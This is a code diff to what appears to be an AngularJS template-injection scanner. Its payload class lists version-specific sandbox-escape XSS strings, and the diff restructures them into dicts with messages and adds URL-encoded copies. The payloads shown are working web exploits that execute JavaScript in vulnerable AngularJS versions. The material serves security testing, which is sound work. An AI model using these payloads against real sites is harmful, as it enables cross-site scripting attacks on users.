@@ -22,6 +22,8 @@
 # OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 # SOFTWARE.
 
+import copy
+
 try: # Python 3
     from urllib.parse import quote_plus
 except: # Python 2
@@ -42,87 +44,104 @@ class Payloads:
         {
             "min": "1.0.0",
             "max": "1.1.5",
-            "value": """{{constructor.constructor('alert(1)')()}}"""
+            "value": """{{constructor.constructor('alert(1)')()}}""",
+            "message": None
         },
         {
             "min": "1.2.0",
             "max": "1.2.1",
-            "value": """{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}"""
+            "value": """{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}""",
+            "message": None
         },
         {
             "min": "1.2.2",
             "max": "1.2.5",
-            "value": """{{a="a"["constructor"].prototype;a.charAt=a.trim;$eval('a",alert(alert=1),"')}}"""
+            "value": """{{a="a"["constructor"].prototype;a.charAt=a.trim;$eval('a",alert(alert=1),"')}}""",
+            "message": None
         },
         {
             "min": "1.2.6",
             "max": "1.2.18",
-            "value": """{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}"""
+            "value": """{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}""",
+            "message": None
         },
         {
             "min": "1.2.19",
             "max": "1.2.23",
-            "value": """{{c=toString.constructor;p=c.prototype;p.toString=p.call;['alert(1)','a'].sort(c)}}"""
+            "value": """{{c=toString.constructor;p=c.prototype;p.toString=p.call;["alert(1)","a"].sort(c)}}""",
+            "message": """Depending on your web browser's sorting algorithm, the ["alert(1)","a"] array must be reversed in order to execute the alert."""
         },
         {
             "min": "1.2.19",
             "max": "1.2.26",
-            "value": """{{(!call?$$watchers[0].get(toString.constructor.prototype):(a=apply)&&(apply=constructor)&&(valueOf=call)&&(''+''.toString('F =Function.prototype;'+'F.apply = F.a;'+'delete F.a;'+'delete F.valueOf;'+'alert(42);')));}}"""
+            "value": """{{(!call?$$watchers[0].get(toString.constructor.prototype):(a=apply)&&(apply=constructor)&&(valueOf=call)&&(''+''.toString('F =Function.prototype;'+'F.apply = F.a;'+'delete F.a;'+'delete F.valueOf;'+'alert(42);')));}}""",
+            "message": None
         },
         {
             "min": "1.2.24",
             "max": "1.2.32",
-            "value": """{{a="a"["constructor"].prototype;a.charAt=a.trim;$eval('a",alert(alert=1),"')}}"""
+            "value": """{{a="a"["constructor"].prototype;a.charAt=a.trim;$eval('a",alert(alert=1),"')}}""",
+            "message": None
         },
         {
             "min": "1.3.0",
             "max": "1.3.0",
-            "value": """{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=''.valueOf; $eval('x=alert(1)//');}}"""
+            "value": """{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=''.valueOf; $eval('x=alert(1)//');}}""",
+            "message": None
         },
         {
             "min": "1.3.0",
             "max": "1.5.8",
-            "value": """{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,alert(1),a')}}"""
+            "value": """{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,alert(1),a')}}""",
+            "message": None
         },
         {
             "min": "1.3.1",
             "max": "1.3.2",
-            "value": """{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=''.valueOf; $eval('x=alert(1)//');}}"""
+            "value": """{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=''.valueOf; $eval('x=alert(1)//');}}""",
+            "message": None
         },
         {
             "min": "1.3.3",
             "max": "1.3.18",
-            "value": """{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)//');}}"""
+            "value": """{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)//');}}""",
+            "message": None
         },
         {
             "min": "1.3.19",
             "max": "1.3.19",
-            "value": """{{'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join;$eval('x=alert(1)//');}}"""
+            "value": """{{'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join;$eval('x=alert(1)//');}}""",
+            "message": None
         },
         {
             "min": "1.3.20",
             "max": "1.3.20",
-            "value": """{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}"""
+            "value": """{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}""",
+            "message": None
         },
         {
             "min": "1.4.0",
             "max": "1.4.14",
-            "value": """{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}"""
+            "value": """{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}""",
+            "message": None
         },
         {
             "min": "1.4.10",
             "max": "1.5.8",
-            "value": """{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}}"""
+            "value": """{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}}""",
+            "message": None
         },
         {
             "min": "1.5.9",
             "max": "1.5.11",
-            "value": """{{c=''.sub.call;b=''.sub.bind;a=''.sub.apply;c.$apply=$apply;c.$eval=b;op=$root.$$phase;$root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;C=c.$apply(c);$root.$$phase=op;$root.$digest=od;B=C(b,c,b);$evalAsync("astNode=pop();astNode.type='UnaryExpression';astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';astNode.argument={type:'Identifier',name:'foo'};");m1=B($$asyncQueue.pop().expression,null,$root);m2=B(C,null,m1);[].push.apply=m2;a=''.sub;$eval('a(b.c)');[].push.apply=a;}}"""
+            "value": """{{c=''.sub.call;b=''.sub.bind;a=''.sub.apply;c.$apply=$apply;c.$eval=b;op=$root.$$phase;$root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;C=c.$apply(c);$root.$$phase=op;$root.$digest=od;B=C(b,c,b);$evalAsync("astNode=pop();astNode.type='UnaryExpression';astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';astNode.argument={type:'Identifier',name:'foo'};");m1=B($$asyncQueue.pop().expression,null,$root);m2=B(C,null,m1);[].push.apply=m2;a=''.sub;$eval('a(b.c)');[].push.apply=a;}}""",
+            "message": None
         },
         {
             "min": "1.6.0",
             "max": "1.6.5",
-            "value": """{{[].pop.constructor('alert(1)')()}}"""
+            "value": """{{[].pop.constructor('alert(1)')()}}""",
+            "message": None
         }
     ]
 
@@ -134,7 +153,7 @@ class Payloads:
             version (str): The AngularJS version to get payloads for (e.g. `1.4.2`).
 
         Returns:
-            list(str): A list of payloads.
+            list(obj): A list of payloads.
 
         """
 
@@ -145,8 +164,11 @@ class Payloads:
 
         for payload in Payloads.__payloads:
             if Payloads.version_is_in_range(version, payload["min"], payload["max"]):
-                payloads.append(payload["value"])
-                payloads.append(quote_plus(payload["value"]))
+                payloads.append(payload)
+
+                payload_encoded = copy.deepcopy(payload)
+                payload_encoded["value"] = quote_plus(payload_encoded["value"])
+                payloads.append(payload_encoded)
 
         Payloads.__cache[version] = payloads
         return payloads
@@ -156,10 +178,10 @@ class Payloads:
         """Replace `alert` with `open` so PhantomJS checks can be done.
 
         Args:
-            payload (str): The current payload.
+            payload (obj): The current payload.
 
         Returns:
-            str: The new payload.
+            obj: The new payload.
 
         Note:
             PhantomJS does not support switching to alerts, which is why we need
@@ -168,7 +190,9 @@ class Payloads:
 
         """
 
-        return payload.replace('alert', 'open')
+        verify_payload = copy.deepcopy(payload)
+        verify_payload["value"] = verify_payload["value"].replace("alert", "open")
+        return verify_payload
 
     @staticmethod
     def version_is_in_range(version, minimum, maximum):
